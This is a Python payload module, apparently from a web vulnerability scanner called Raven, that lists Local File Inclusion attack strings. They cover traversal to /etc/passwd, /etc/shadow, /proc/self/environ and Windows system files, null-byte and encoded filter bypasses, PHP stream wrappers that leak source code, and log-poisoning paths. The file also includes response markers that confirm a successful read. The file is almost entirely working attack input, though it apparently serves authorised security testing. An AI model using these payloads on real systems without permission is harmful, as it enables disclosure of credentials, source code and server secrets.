"""
web/payloads/lfi.py
-------------------
Local File Inclusion (LFI) payload library for Raven Phase 8.

Covers:
  - Unix path traversal (../../etc/passwd)
  - Windows path traversal (..\windows\system32\...)
  - Null-byte injection (path%00.jpg)
  - PHP stream wrappers (php://filter, php://input, data://)
  - Log poisoning paths (apache, nginx, syslog)
  - Encoded traversal (URL-encoded, double-encoded)
"""

from __future__ import annotations

from web.payloads import PayloadContext

# ── Raw payload strings ────────────────────────────────────────────────────────

PAYLOADS: list[str] = [
    # ── Unix — direct path traversal ─────────────────────────────────────────
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    # ── Unix — double-dot bypass variants ────────────────────────────────────
    "....//....//....//etc/passwd",
    ".././.././.././etc/passwd",
    # ── Windows path traversal ────────────────────────────────────────────────
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:/windows/win.ini",
    # ── Null-byte injection (PHP < 5.3.4) ─────────────────────────────────────
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    # ── PHP stream wrappers ───────────────────────────────────────────────────
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://input",
    # ── Log poisoning targets ─────────────────────────────────────────────────
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    # ── URL-encoded traversal ─────────────────────────────────────────────────
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # ── Double-encoded traversal ──────────────────────────────────────────────
    "..%252f..%252f..%252fetc%252fpasswd",
    # ── UTF-8 overlong encoding ───────────────────────────────────────────────
    "..%c0%af..%c0%afetc/passwd",
]

# ── Expected indicators for LFI confirmation ──────────────────────────────────

LFI_INDICATORS: list[str] = [
    "root:x:0:0:",
    "daemon:x:",
    "[boot loader]",
    "[extensions]",
    "<?php",
    "DOCUMENT_ROOT",
    "HTTP_USER_AGENT",
]

# ── Rich payload metadata ──────────────────────────────────────────────────────

CONTEXTS: list[PayloadContext] = [
    PayloadContext(
        payload="../../../../etc/passwd",
        injection_type="query_param",
        expected_indicator="root:x:0:0:",
        severity="Critical",
        vuln_type="LFI",
    ),
    PayloadContext(
        payload="/etc/passwd",
        injection_type="query_param",
        expected_indicator="root:x:0:0:",
        severity="Critical",
        vuln_type="LFI",
    ),
    PayloadContext(
        payload="../../../../etc/passwd%00",
        injection_type="query_param",
        expected_indicator="root:x:0:0:",
        severity="Critical",
        vuln_type="LFI",
    ),
    PayloadContext(
        payload="php://filter/convert.base64-encode/resource=index.php",
        injection_type="query_param",
        expected_indicator="<?php",
        severity="Critical",
        vuln_type="LFI",
    ),
    PayloadContext(
        payload="..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        injection_type="query_param",
        expected_indicator="localhost",
        severity="High",
        vuln_type="LFI",
    ),
    PayloadContext(
        payload="/var/log/apache2/access.log",
        injection_type="query_param",
        expected_indicator="HTTP_USER_AGENT",
        severity="High",
        vuln_type="LFI",
    ),
    PayloadContext(
        payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        injection_type="query_param",
        expected_indicator="root:x:0:0:",
        severity="High",
        vuln_type="LFI",
    ),
]
